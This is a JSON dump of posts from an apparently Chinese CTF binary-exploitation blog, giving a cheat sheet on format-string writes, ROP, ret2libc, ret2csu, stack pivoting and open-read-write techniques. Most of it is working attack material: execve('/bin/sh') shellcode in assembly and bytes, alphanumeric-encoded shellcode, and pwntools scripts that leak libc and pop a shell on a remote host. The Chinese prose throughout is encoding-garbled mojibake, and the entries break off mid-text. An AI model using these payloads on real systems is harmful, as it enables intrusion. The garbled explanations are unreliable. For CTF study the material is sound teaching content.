b&#39;a&#39;*(0x34 - 0x12 - 4) + b&#39;%12$hhn&#39; + b&#39;bbb&#39; ï¼ˆå½“å‰æ€»é•¿åº¦=68ï¼‰ æ¥ä¸‹æ¥å¡«å……æ¬¡ä½ä½ã€‚æ„é€ æ–¹æ³•å’Œä¸Šé¢ç±»ä¼¼ï¼Œä¸è¿‡æ·»åŠ å­—ç¬¦çš„æ—¶å€™è¦è®°å¾—æŠŠ bbb è¿™ä¸‰ä¸ªå¯¹é½å­—èŠ‚çš„é•¿åº¦å‡å»ï¼š payload += p32(0x0804c029) + b&#39;a&#39;*(0x56 - 0x34 - 4 - 3) + b&#39;%23$hhn&#39; + b&#39;bb&#39; ï¼ˆå½“å‰æ€»é•¿åº¦=108ï¼‰ æœ€åå¡«å……ä½ä½ï¼š payload += p32(0x0804c028) + b&#39;a&#39;*(0x78- 0x56 - 4 - 2) + b&#39;%33$hhn&#39; pwntoolså·¥å…·123456fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)offset (int): å­—ç¬¦ä¸²çš„åç§»ï¼Œä»1å¼€å§‹writes (dict): æ³¨å…¥çš„åœ°å€å’Œå€¼ï¼Œ&#123;target_addr:change_to&#125;numbwritten (int) : å·²ç»ç”±printfå‡½æ•°å†™å…¥çš„å­—èŠ‚æ•°ï¼Œé»˜è®¤ä¸º0write_size : é€byte/short/intå†™å…¥ï¼Œé»˜è®¤æ˜¯byte","categories":[{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"}],"tags":[{"name":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","slug":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","permalink":"https://lazzzaro.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"}],"author":"Lazzaro"},{"title":"å †","slug":"pwn-å †","date":"2021-08-08T09:59:44.000Z","updated":"2023-08-07T15:03:15.638Z","comments":true,"path":"2021/08/08/pwn-å †/","permalink":"https://lazzzaro.github.io/2021/08/08/pwn-%E5%A0%86/","excerpt":"","text":"â€‹ å † â€‹ UAFï¼ˆé¢„ç•™ï¼‰ â€‹ binæ”»å‡»fastbin attackï¼ˆé¢„ç•™ï¼‰ â€‹ unsorted bin attackï¼ˆé¢„ç•™ï¼‰ â€‹ largebin attackï¼ˆé¢„ç•™ï¼‰ â€‹ tcache attackï¼ˆé¢„ç•™ï¼‰ â€‹ off byæ”»å‡»off by oneï¼ˆé¢„ç•™ï¼‰ â€‹ off by nullï¼ˆé¢„ç•™ï¼‰ â€‹ unlinkï¼ˆé¢„ç•™ï¼‰ â€‹ house ofç³»åˆ—house of forceï¼ˆé¢„ç•™ï¼‰ â€‹ house of spiritï¼ˆé¢„ç•™ï¼‰ â€‹ house of einherjarï¼ˆé¢„ç•™ï¼‰ â€‹ house of romanï¼ˆé¢„ç•™ï¼‰ â€‹ house of orangeï¼ˆé¢„ç•™ï¼‰ â€‹ house of loreï¼ˆé¢„ç•™ï¼‰ â€‹ house of rabbitï¼ˆé¢„ç•™ï¼‰ â€‹ house of kiwiï¼ˆé¢„ç•™ï¼‰ â€‹ house of bananaï¼ˆé¢„ç•™ï¼‰ â€‹ house of appleï¼ˆé¢„ç•™ï¼‰ â€‹ house of catï¼ˆé¢„ç•™ï¼‰ â€‹ house of emmaï¼ˆé¢„ç•™ï¼‰ â€‹","categories":[{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"}],"tags":[{"name":"å †","slug":"å †","permalink":"https://lazzzaro.github.io/tags/%E5%A0%86/"}],"author":"Lazzaro"},{"title":"æ ˆ","slug":"pwn-æ ˆ","date":"2021-08-08T09:59:35.000Z","updated":"2023-11-16T11:33:45.851Z","comments":true,"path":"2021/08/08/pwn-æ ˆ/","permalink":"https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%88/","excerpt":"","text":"â€‹ ROPROPï¼ˆReturn-Oriented Programming, è¿”å›å¯¼å‘ç¼–ç¨‹ï¼‰ é€šè¿‡æ ˆæº¢å‡ºçš„æ¼æ´ï¼Œè¦†ç›–return addressï¼Œä»è€Œè¾¾è®©ç›´è¡Œç¨‹åºåå¤æ¨ªè·³çš„ä¸€ç§æŠ€æœ¯ã€‚ é™æ€ç”ŸæˆROPchainï¼š ROPgadget --binary [file] --ropchain ropper --file [file] --chain execve â€‹ ret2syscall32ä½è°ƒç”¨çº¦å®šï¼šç³»ç»Ÿè°ƒç”¨å· $eaxï¼Œå‚æ•°ï¼š$ebx/$ecx/$edx/$esi/$edi/$ebpï¼Œè°ƒç”¨ int 0x80ã€‚ è°ƒç”¨ execve(&quot;/bin/sh&quot;, 0, 0)ï¼š 1234567891011# $eax = 0xb = 11ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep eax# $ebx = [&quot;/bin/sh&quot;]ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep ebxROPgadget --binary vuln --string &quot;/bin/sh&quot;# $ecx = 0ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep ecx# $edx = 0ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep edx# int 0x80ROPgadget --binary vuln --only &quot;int&quot; 64ä½è°ƒç”¨çº¦å®šï¼šç³»ç»Ÿè°ƒç”¨å· $raxï¼Œå‚æ•°ï¼š$rdi/$rsi/$rdx/$rcx($r10)/$r8/$r9ï¼Œè°ƒç”¨ syscallã€‚ è°ƒç”¨ execve(&quot;/bin/sh&quot;, 0, 0)ï¼š 1234567891011# $rax = 0x3b = 59ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep rax# $rdi = [&quot;/bin/sh&quot;]ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep rdiROPgadget --binary vuln --string &quot;/bin/sh&quot;# $rsi = 0ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep rsi# $rdx = 0ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep rdx# syscallROPgadget --binary vuln --only &quot;syscall&quot; â€‹ ret2shellcodeshellcodeæ•°æ®åº“ï¼š Shellcodes database for study cases å¸¸ç”¨shellcodepwntools 123# pwntoolscontext.arch = elf.archshellcode = asm(shellcreaft.sh()) 32ä½ 12345678910111213141516171819202122232425262728293031323334353637383940# othershellcode = asm(&#x27;&#x27;&#x27;push eax pop ebx push edx pop eax dec eax xor al,0x46 xor byte ptr[ebx+0x35],al #set int 0x80 xor byte ptr[ebx+0x36],al push ecx pop eax xor al, 0x41 xor al, 0x40 push ecx pop eax xor al, 0x41 xor al, 0x40 push ecx pop eax xor al, 0x41 xor al, 0x40 push ecx # set al=0xb pop eax xor al, 0x41 xor al, 0x40 push edx # set ecx=0 pop ecx push 0x68 # push /bin/sh push 0x732f2f2f push 0x6e69622f push esp pop ebx&#x27;&#x27;&#x27;) # other# 21 bytes&#x27;\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80&#x27;# ascii&#x27;PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA&#x27;# for scanf&#x27;\\xeb\\x1b\\x5e\\x89\\xf3\\x89\\xf7\\x83\\xc7\\x07\\x29\\xc0\\xaa\\x89\\xf9\\x89\\xf0\\xab\\x89\\xfa\\x29\\xc0\\xab\\xb0\\x08\\x04\\x03\\xcd\\x80\\xe8\\xe0\\xff\\xff\\xff/bin/sh&#x27; 64ä½ 12345678910111213141516# read(0,0xcafe0000,0x1000)shellcode = asm(&quot;&quot;&quot; xor eax, eax /* SYS_read */ xor edi, edi /* 0 */ mov edx, 0x1000 mov esi, 0xcafe0000 syscall&quot;&quot;&quot;)# other# 23 bytes&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&#x27;# ascii&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;# for scanf&#x27;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&#x27; shellcodeé™åˆ¶å¯è§å­—ç¬¦å·¥å…·ï¼š AE64ã€alpha3ã€shellcode_encoder å‚è€ƒï¼š MRCTF 2020 - shellcode_revenge NSSRound#4 - ç™¾å¯†ä¸€ç– 1 2 3 NewStarCTF 2023 - shellcode revenge [åŸåˆ›]å¯è§shellcodeå­—ç¬¦çš„è‰ºæœ¯ æ›´å¤šé™åˆ¶å‡½æ•° __ctype_b_loc() å¦‚ if ( ((*__ctype_b_loc())][s[i]] &amp; 0x4000) == 0 &amp;&amp; s[i] != 10) &#123;&#125; è§ ctype/ctype.h æºç ï¼Œä½œç”¨ä¸ºå°†è¾“å…¥çš„å­—ç¬¦æ ¹æ® ((bit) &lt; 8 ? ((1 &lt;&lt; (bit)) &lt;&lt; 8) : ((1 &lt;&lt; (bit)) &gt;&gt; 8)) è¿›è¡Œå¤„ç†ï¼Œç„¶åæ ¹æ®ä¸‹é¢è¡¨å¯¹åº”çš„ç»“æœè¿›è¡Œè¿”å›ã€‚ å‚è€ƒï¼š2021 å¤©ç¿¼æ¯ - ezshell â€‹ ret2libclibcæ•°æ®åº“ï¼š https://libc.blukat.me/ https://libc.rip/ https://libc.nullbyte.cat/ glibc-all-in-one æ¿å­æŸ¥gadgetï¼š ROPgadget --binary [file] --only &quot;pop|ret&quot; | grep &quot;xxx&quot; ropper --file [file] --search &quot;xxx&quot; ç»™å®šlibc1234567891011121314151617181920212223242526272829# x64from pwn import *r = remote(&#x27;x.x.x.x&#x27;, 22222)# r = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so&#x27;)write_plt = elf.plt.writewrite_got = elf.got.writemain_addr = elf.sym.mainpop_rdi = 0x401233pop_rsi = 0x401231pl = &#x27;a&#x27;*(0x80+8)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(write_got)+p64(0)+p64(write_plt)+p64(main_addr)p.sendline(pl)write_addr = u64(r.recv(6).ljust(8,&#x27;\\x00&#x27;))# æˆ– write_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))print(hex(write_addr))libc_base = write_addr-libc.sym.writeprint(hex(libc_base))system_addr = libc_base+libc.sym.systembinsh_addr = libc_base+libc.search(&#x27;/bin/sh&#x27;).next()pl = &#x27;a&#x27;*(0x80+8)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)p.sendline(pl)p.interactive() ä½¿ç”¨LibcSearcherLibcSearcheré¡¹ç›®: LibcSearcherã€LibcSearcher_plus 12345678910111213141516171819202122232425262728# x64from pwn import *from LibcSearcher import *r = remote(&#x27;x.x.x.x&#x27;, 22222)elf = ELF(&#x27;./pwn&#x27;)pop_rdi_ret = 0x400c83ret = 0x4006b9puts_plt = elf.plt.putsputs_got = elf.got.putsmain_addr = elf.sym.mainpayload = &#x27;a&#x27;*0x58 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)r.sendline(payload)puts_addr = u64(r.recv(6).ljust(0x8, b&#x27;\\x00&#x27;))# æˆ– puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)print(libcbase)sys_addr = libcbase + libc.dump(&#x27;system&#x27;)bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)payload = &#x27;a&#x27;*0x58 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)r.sendline(payload)r.interactive() one_gadgetæŸ¥æ‰¾å·²çŸ¥çš„libcä¸­ exevce(&quot;/bin/sh&quot;) è¯­å¥çš„åœ°å€ï¼š one_gadget libc.so 123456789101112131415161718192021222324252627# x64from pwn import *r = remote(&#x27;x.x.x.x&#x27;, 22222)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so&#x27;)pop_rdi_ret = 0x400c83ret = 0x4006b9puts_plt = elf.plt.putsputs_got = elf.got.putsmain_addr = elf.sym.mainpayload = &#x27;a&#x27;*0x58 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)r.sendline(payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))print(hex(puts_addr))libc_base = puts_addr - libc.sym.puts#one_gadget libc.soexecve_addr = libc_base + 0x10a38cpayload = &#x27;a&#x27;*0x58 + p64(execve_addr)r.sendline(payload)r.interactive() â€‹ ret2csuåœ¨x64ä¸­ï¼Œå¦‚æœé‡åˆ°å‡½æ•°è°ƒç”¨éœ€è¦ä¼ å…¥3ä¸ªå‚æ•°ï¼Œåˆ†åˆ«ä¾èµ–rdi/rsi/rdxä¸‰ä¸ªå¯„å­˜å™¨ï¼Œä½†é€šè¿‡ROPgadgetæ— æ³•æ‰¾åˆ°ç›¸å…³çš„å¯„å­˜å™¨åˆ©ç”¨é“¾ï¼Œè¿™æ—¶å°±è¦å¼€å§‹è€ƒè™‘é€šè¿‡è°ƒç”¨__libc_csu_initå‡½æ•°æ¥å®ç°ä¼ é€’3ä¸ªå‚æ•°çš„æ•ˆæœï¼Œè¿™ç§å®ç°æ–¹å¼ï¼Œç§°ä¸º ret2csuã€‚ gadget1 éƒ¨åˆ†ï¼š 1234567400610 pop rbx # å¿…é¡»ä¸º 0400613 pop rbp # å¿…é¡»ä¸º 1400616 pop r12 # callï¼ˆç”±äºä¸‹é¢ call æŒ‡ä»¤çš„å¯»å€æ–¹å¼ä¸ºé—´æ¥å¯»å€ï¼Œæ‰€ä»¥æ­¤å¤„åº”ä¸ºgotè¡¨åœ°å€ï¼‰400619 pop r13 # arg340061d pop r14 # arg2400621 pop r15 # arg1400624 retn # to gadget2 gadget2 éƒ¨åˆ†ï¼š 123456789101112131415400610 mov rdx, r13 # ä¼ å…¥ç¬¬ä¸‰ä¸ªå‚æ•°rdx400613 mov rsi, r14 # ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°rsi400616 mov edi, r15 # ä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°rdi400619 call qword ptr [r12+rbx*8] call # æ­¤æ—¶ rbx=0 ï¼Œr12=func_got,call[r12]=call func40061d add rbx, 1400621 cmp rbx, rbp400624 jnz short loc_400880400626 add rsp, 8 # padding40062a pop rbx # padding40062b pop rbp # padding40062c pop r12 # padding40062e pop r13 # padding400630 pop r14 # padding400632 pop r15 # padding400634 retn â€”â€”&gt; # æ„é€ padding(7*8=56byte)å°±è¿”å› ROPé“¾ï¼š 12345678910111213141516gadget1_addr0 (must)1 (must)write_got0x10 (write_arg3_size)write_got (write_arg2_buf)1 (write_arg1_fd)gadget2_addrAAAAAAAA (å¡«å…… add rsp, 8)AAAAAAAA (å¡«å…… pop rbx)AAAAAAAA (å¡«å…… pop rbp)AAAAAAAA (å¡«å…… pop r12)AAAAAAAA (å¡«å…… pop r13)AAAAAAAA (å¡«å…… pop r14)AAAAAAAA (å¡«å…… pop r15)0xffffffffffffffff (ret) å‚è€ƒï¼š å…³äºå­¦ä¹ ret2csuçš„æ€»ç»“ Linux x64 ä¸‹çš„ä¸‡èƒ½ Gadget â€‹ ret2dl_resolveï¼ˆé¢„ç•™ï¼‰ â€‹ å…¶ä»–å§¿åŠ¿æ ˆè¿ç§»åœ¨ä¸€èˆ¬çš„æ ˆæº¢å‡ºæ”»å‡»æ—¶ï¼Œæœ‰ä¸€ä¸ªå‰ææ¡ä»¶æ˜¯â€œæœ‰å……åˆ†çš„æ ˆç©ºé—´ç”¨æ¥å¸ƒå±€â€ï¼Œé€šå¸¸æˆ‘ä»¬ä¼šåœ¨æ ˆçš„å‰©ä½™ç©ºé—´ä¸Šå­˜æ”¾ä¸€äº›æ¶æ„æŒ‡ä»¤ã€‚ä½†æ˜¯å½“æ ˆçš„å‰©ä½™ç©ºé—´å¾ˆå°æ—¶ï¼Œä¾‹å¦‚åªå¯è¦†ç›–ebpå’Œretï¼Œä¸€èˆ¬çš„æ ˆæº¢å‡ºæ€è·¯å°±æ— æ³•å®Œæˆæ”»å‡»ã€‚ ä¸è¿‡æ—¢ç„¶æ ˆä¸Šæ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´ä¾›æˆ‘ä»¬å¸ƒç½®ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å°è¯•æ‰¾å¦ä¸€å—ç©ºé—´æ¥è¿›è¡Œå¸ƒå±€ï¼Œç„¶åå°†æ ˆæŒ‡é’ˆespåŠ«æŒåˆ°è¿™é‡Œå°±èƒ½å®Œæˆæ”»å‡»ï¼Œè¿™å°±æ˜¯â€æ ˆè¿ç§»â€œçš„åŸºæœ¬æ€æƒ³ã€‚ å¦‚å›¾æ‰€ç¤ºï¼Œå½“ä¸»è°ƒå‡½æ•°è°ƒç”¨funcå‡½æ•°æ—¶ï¼š æ‰§è¡Œpush eip+4å°†è°ƒç”¨è¯­å¥çš„ä¸‹ä¸€æ¡è¯­å¥ä¿å­˜åˆ°æ ˆä¸Šï¼Œç”¨æ¥åœ¨å‡½æ•°è¿”å›æ—¶è·³è½¬åˆ°è¿”å›åœ°å€ï¼ˆretï¼‰ PCæŒ‡å‘funcå‡½æ•°çš„åœ°å€ åœ¨æ‰§è¡Œfuncå‡½æ•°å‰ï¼š funcä¼šå…ˆå°†ebpå¯„å­˜å™¨ä¸­çš„å€¼ä¿å­˜åˆ°æ ˆä¸Šï¼Œç”¨äºåœ¨å‡½æ•°è¿”å›æ—¶è¿˜åŸebpä¸ºä¸»è°ƒå‡½æ•°çš„æ ˆåº•ã€‚ å‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œè¿”å›ï¼Œä¼šæ‰§è¡Œleave retè¿™ä¸¤æ¡è¯­å¥ leaveç›¸å½“äºmov esp,ebpï¼ˆæŠŠæ ˆæŒ‡é’ˆæŒ‡å‘æ ˆåº•ï¼Œé”€æ¯æ ˆå¸§ï¼‰ã€pop ebpï¼ˆè¿˜åŸebpä¸ºä¸»è°ƒå‡½æ•°çš„æ ˆåº•ï¼‰ã€‚ retç›¸å½“äºpop eipï¼ˆæŠŠæ ˆä¸Šä¿å­˜çš„è¿”å›åœ°å€å­˜å…¥eipå¯„å­˜å™¨ï¼‰ ä»è¿™é‡Œå¯ä»¥çŸ¥é“ï¼Œebpçš„å€¼å¯ä»¥æ§åˆ¶espï¼Œä½†æ˜¯leaveæŒ‡ä»¤æ˜¯å…ˆmov esp,ebpåpop ebpï¼Œçœ‹ä¸Šå»æ²¡æœ‰åŠæ³•é€šè¿‡ä¿®æ”¹æ ˆä¸Šä¿å­˜çš„ebpæ”¹å˜espçš„å€¼ï¼Œä¸è¿‡ä¸è¦å¿˜è®°æˆ‘ä»¬è¿˜å¯ä»¥æ§åˆ¶retçš„å€¼ï¼Œå¦‚æœæŠŠretè¦†ç›–ä¸ºleave retçš„åœ°å€ï¼Œæˆ‘ä»¬è¦†ç›–çš„å‡ebpå°±å¯ä»¥é€šè¿‡ä¸¤æ¬¡leaveè¯­å¥åˆ°espå¯„å­˜å™¨ä¸Šï¼Œä»è€Œå®Œæˆäº†æ ˆè¿ç§»ã€‚ æ€è·¯ï¼š åˆ©ç”¨ç¬¬ä¸€æ¬¡è¾“å…¥æ³„éœ²å‡ºebpåœ°å€ï¼Œå†åˆ©ç”¨ç¬¬äºŒæ¬¡è¾“å…¥æ„é€ ä¸€ä¸ªæ ˆï¼Œå°†espåŠ«æŒåˆ°æˆ‘ä»¬æ„é€ çš„æ ˆä¸Šï¼Œå†æŠŠæ ˆä¸Šçš„è¿”å›åœ°å€æ”¹ä¸ºsystemå‡½æ•°çš„åœ°å€ï¼Œè¿™æ ·å°±æ¨¡æ‹Ÿå‡ºäº†ä¸€æ¬¡system(&quot;/bin/sh&quot;)çš„è°ƒç”¨ã€‚ å‚è€ƒï¼š ciscn_2019_es_2 â€‹ ç‰¹æ®Šç³»ç»Ÿè°ƒç”¨mprotectå°†å†…å­˜é¡µçš„æƒé™ä¿®æ”¹ä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œã€‚ éœ€è¦æ³¨æ„çš„æ˜¯æŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼ˆ4Kï¼‰ã€‚åŒºé—´å¼€å§‹çš„åœ°å€startå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œå¹¶ä¸”åŒºé—´é•¿åº¦lenå¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ã€‚ 12345678910111213141516171819#include &lt;sys/mman.h&gt;int mprotect(void *addr, size_t len, int prot);/*addrï¼šä¿®æ”¹ä¿æŠ¤å±æ€§åŒºåŸŸçš„èµ·å§‹åœ°å€ï¼Œaddrå¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œç®€è€Œè¨€ä¹‹ä¸ºé¡µå¤§å°ï¼ˆä¸€èˆ¬æ˜¯ 4KB == 4096å­—èŠ‚ï¼‰æ•´æ•°å€ã€‚lenï¼šè¢«ä¿®æ”¹ä¿æŠ¤å±æ€§åŒºåŸŸçš„é•¿åº¦,æœ€å¥½ä¸ºé¡µå¤§å°æ•´æ•°å€ã€‚ä¿®æ”¹åŒºåŸŸèŒƒå›´[addr, addr+len-1]ã€‚protï¼šå¯ä»¥å–ä»¥ä¸‹å‡ ä¸ªå€¼ï¼Œå¹¶å¯ä»¥ç”¨â€œ|â€å°†å‡ ä¸ªå±æ€§ç»“åˆèµ·æ¥ä½¿ç”¨ï¼š1ï¼‰PROT_READï¼šå†…å­˜æ®µå¯è¯»ï¼›2ï¼‰PROT_WRITEï¼šå†…å­˜æ®µå¯å†™ï¼›3ï¼‰PROT_EXECï¼šå†…å­˜æ®µå¯æ‰§è¡Œï¼›4ï¼‰PROT_NONEï¼šå†…å­˜æ®µä¸å¯è®¿é—®ã€‚è¿”å›å€¼ï¼š0ï¼›æˆåŠŸï¼Œ-1ï¼›å¤±è´¥ï¼ˆå¹¶ä¸”errnoè¢«è®¾ç½®ï¼‰1ï¼‰EACCESï¼šæ— æ³•è®¾ç½®å†…å­˜æ®µçš„ä¿æŠ¤å±æ€§ã€‚å½“é€šè¿‡ mmap(2) æ˜ å°„ä¸€ä¸ªæ–‡ä»¶ä¸ºåªè¯»æƒé™æ—¶ï¼Œæ¥ç€ä½¿ç”¨ mprotect() æ ‡å¿—ä¸º PROT_WRITEè¿™ç§æƒ…å†µå°±ä¼šå‘ç”Ÿã€‚2ï¼‰EINVALï¼šaddrä¸æ˜¯æœ‰æ•ˆæŒ‡é’ˆï¼Œæˆ–è€…ä¸æ˜¯ç³»ç»Ÿé¡µå¤§å°çš„å€æ•°ã€‚3ï¼‰ENOMEMï¼šå†…æ ¸å†…éƒ¨çš„ç»“æ„ä½“æ— æ³•åˆ†é…ã€‚è¿™é‡Œçš„å‚æ•°protï¼š r:4 w:2 x:1protä¸º7ï¼ˆ1+2+4ï¼‰å°±æ˜¯rwxå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œä¸linuxæ–‡ä»¶å±æ€§ç”¨æ³•ç±»ä¼¼ã€‚ */ getdents64è¯»å–ç›®å½•ç»“æ„ã€‚ int getdents(unsigned int fd, struct linux_dirent *dirp,unsigned int count); å‚æ•°ä¸€ï¼šfdæŒ‡é’ˆ å‚æ•°äºŒï¼šå†™å…¥çš„å†…å­˜åŒºåŸŸ å‚æ•°ä¸‰ï¼š4096 åŠŸèƒ½ï¼šæŠŠå½“å‰æ–‡ä»¶ç›®å½•ä¸‹çš„æ–‡ä»¶åå†™å…¥å‚æ•°äºŒæŒ‡å‘çš„å†…å­˜åŒºåŸŸ è¯¥å‡½æ•°æ˜¯ä¸€ä¸ªè§£ææ–‡ä»¶å¤¹çš„å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ—¶è¦è§£æçš„æ–‡ä»¶å¥æŸ„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å­˜æ”¾è§£ææ•°æ®çš„ä½ç½®ï¼Œcountæ˜¯dirpçš„å¤§å°ï¼Œé€šè¿‡è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥è§£ææ–‡ä»¶å¤¹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å½“æ‰“å¼€æ–‡ä»¶å¤¹æ—¶opençš„ç¬¬äºŒä¸ªå‚æ•°ä¸º0x10000,æ‰“å¼€æ–‡ä»¶æ—¶çš„å‚æ•°ä¸º0ã€‚ è¿”å›ç»“æ„ä½“ï¼š 1234567struct linux_dirent64 &#123; ino64_t d_ino; /* 64-bit inode number */ off64_t d_off; /* 64-bit offset to next structure */ unsigned short d_reclen; /* Size of this dirent */ unsigned char d_type; /* File type */ char d_name[]; /* Filename (null-terminated) */&#125;; â€‹ orworw æ–¹å¼ï¼Œå³ open-read-writeï¼Œé€šè¿‡æ–‡ä»¶æ“ä½œç›´æ¥è·å–æ–‡ä»¶å†…å®¹ã€‚ æŸ¥æ‰¾ syscall; ret çš„ gadgetæ–¹æ³• ç”¨ opcode åŠŸèƒ½æœ 123from pwn import *print(asm(&#x27;syscall;ret&#x27;).encode(&#x27;hex&#x27;))# 0f05c3 ROPgadgetæœç´¢ ROPgadget --binary libc-2.31.so --opcode 0f05c3 shellcodepwntools 1234567891011# pwntoolsshellcode = &#x27;&#x27;shellcode += shellcraft.open(&#x27;./flag&#x27;)shellcode += shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,0x100)shellcode += shellcraft.write(1,&#x27;esp&#x27;,0x100)payload1 = asm(shellcode)shellcode = b&quot;\\x90&quot; * 0x100shellcode += asm(shellcraft.open(&quot;/flag&quot;))shellcode += asm(shellcraft.read(3, 0xCAFE0500, 0x500))shellcode += asm(shellcraft.write(1, 0xCAFE0500, 0x500)) 32ä½ 1234567891011121314151617181920shellcode = &quot;&quot;&quot; /*open(./flag)*/ push 0x1010101 xor dword ptr [esp], 0x1016660 push 0x6c662f2e mov eax,0x5 mov ebx,esp xor ecx,ecx int 0x80 /*read(fd,buf,0x100)*/ mov ebx,eax mov ecx,esp mov edx,0x30 mov eax,0x3 int 0x80 /*write(1,buf,0x100)*/ mov ebx,0x1 mov eax,0x4 int 0x80 &quot;&quot;&quot; 64ä½ 123456789101112131415161718192021shellcode = asm(&#x27;&#x27;&#x27; /*open(./flag)*/ push 0x67616c66 mov rdi,rsp xor esi,esi push 2 pop rax syscall /*read(fd,buf,0x100)*/ mov rdi,rax mov rsi,rsp mov edx,0x100 xor eax,eax syscall /*write(1,buf,0x100)*/ mov edi,1 mov rsi,rsp push 1 pop rax syscall &#x27;&#x27;&#x27;) ROPé“¾open 1234567891011# open(&quot;.&quot;)payload += p64(pop_rax_ret)payload += p64(2)payload += p64(pop_rdi_ret)payload += p64(bss_addr)payload += p64(pop_rsi_ret)payload += p64(0)payload += p64(pop_rdx_r12_ret)payload += p64(0)payload += p64(0)payload += p64(syscall_ret) read 123456789# read(0, bss_addr, 2)payload += p64(pop_rdi_ret)payload += p64(0)payload += p64(pop_rsi_ret)payload += p64(bss_addr)payload += p64(pop_rdx_r12_ret)payload += p64(2)payload += p64(0)payload += p64(elf.sym[&#x27;read&#x27;]) write 1234567891011# write(1, bss_addr + 0x200, 0x600)payload += p64(pop_rax_ret)payload += p64(1)payload += p64(pop_rdi_ret)payload += p64(1)payload += p64(pop_rsi_ret)payload += p64(bss_addr + 0x200)payload += p64(pop_rdx_r12_ret)payload += p64(0x600)payload += p64(0)payload += p64(syscall_ret) seccompä¿æŠ¤ / sandboxç‰¹å¾ï¼šåœ¨ sandbox å‡½æ•°ä¸­çœ‹åˆ°â¼¤é‡çš„èµ‹å€¼è¯­å¥ï¼Œæœ€åè°ƒâ½¤äº† prctlã€‚ æŸ¥çœ‹é™åˆ¶ï¼šseccomp-tools dump ./pwn â€‹ ä¿æŠ¤ALSRASLR çš„æ˜¯æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½é€‰é¡¹ï¼Œä½œç”¨äº executableï¼ˆELFï¼‰è£…å…¥å†…å­˜è¿è¡Œæ—¶ï¼Œå› è€Œåªèƒ½éšæœºåŒ– stackã€heapã€libraries çš„åŸºå€ã€‚ â€‹ NXNo-Executeï¼ˆä¸å¯æ‰§è¡Œï¼‰ï¼ŒNX çš„åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæ‰§è¡Œæµè¢«åŠ«æŒåˆ°æ ˆä¸Šæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œå› ä¸ºæ•°æ®é¡µè¢«æ 